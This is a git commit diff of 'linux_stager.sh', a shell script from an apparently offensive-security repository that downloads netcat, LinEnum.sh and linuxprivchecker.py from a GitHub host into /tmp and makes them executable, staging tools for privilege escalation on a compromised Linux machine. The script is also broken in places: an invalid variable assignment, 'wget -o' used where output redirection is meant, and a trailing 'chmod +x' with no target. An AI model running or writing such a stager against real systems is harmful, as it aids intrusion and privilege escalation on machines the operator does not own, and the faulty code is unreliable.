139af10be196213e7937b783b138420d6bbba219
WillChaos <46702070+WillChaos@users.noreply.github.com>
2019-03-02 17:43:27 +0800

    Update linux_stager.sh

--- PrivEsc/linux_stager.sh
+++ PrivEsc/linux_stager.sh
@@ -1,10 +1,23 @@
 # used to stage all appropriate tools needed for privesc
+# download this file using: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh
 
-$stageingDir = /tmp/
+$stage = /tmp
+
+# banner
+echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
+echo "[]_________________________________________________________________________________________[]"
 
 # download NC
+echo "[*] Downloadingf NC to: $stage + making executable"
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
+chmod +x $stage/nc
 
-# download linenum.py
+# download linenum.sh
+echo "[*] Downloadingf linenum.sh to: $stage + making executable"
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o $stage/linenum.sh
+chmod +x $stage/linenum.sh
 
-# download portable python
-
+# download LinxPrivChecker.py
+echo "[*] Downloadingf LinuxPrivChecker.sh to: $stage + making executable"
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
+chmod +x 
